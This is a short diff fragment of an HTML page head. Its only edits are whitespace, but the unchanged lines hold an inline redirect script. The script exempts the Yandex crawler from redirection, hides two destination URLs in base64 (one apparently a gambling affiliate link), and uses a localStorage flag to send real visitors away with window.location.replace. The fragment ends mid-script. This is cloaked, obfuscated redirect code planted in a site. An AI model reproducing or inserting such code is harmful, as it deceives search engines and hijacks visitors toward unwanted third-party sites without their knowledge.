@@ -9,17 +9,19 @@
 <meta name="robots" content="index, follow, noarchive">
 <link rel="stylesheet" href="fnx-styles.css">
 <link rel="icon" type="image/png" sizes="192x192" href="/android-chrome-192x192.png"> 
-<script>
+	<script>
   (function() {
     var ua = navigator.userAgent.toLowerCase();
     if (ua.indexOf("yandex") !== -1) {
         console.log("Яндекс бот — без редиректа");
         return;
     }
-    var mainBrandB64 = "aHR0cHM6Ly9mbmtzbGluay5vcmcvZDd0dGxyeXZo";
+    var mainBrandB64 = "aHR0cHM6Ly9mbmtzbGluay5vcmcvZDd0dGxyeXZo"; 
     var crossBrandB64 = "aHR0cHM6Ly9tZWdhd2F5czEuY29tL2M1NzA3ODY2ZT9idGFnPWZlbml4"; 
+
     var mainUrl = atob(mainBrandB64);
     var crossUrl = atob(crossBrandB64);
+
     if (localStorage.getItem('vstd_eva')) {
         window.location.replace(crossUrl);
         return;
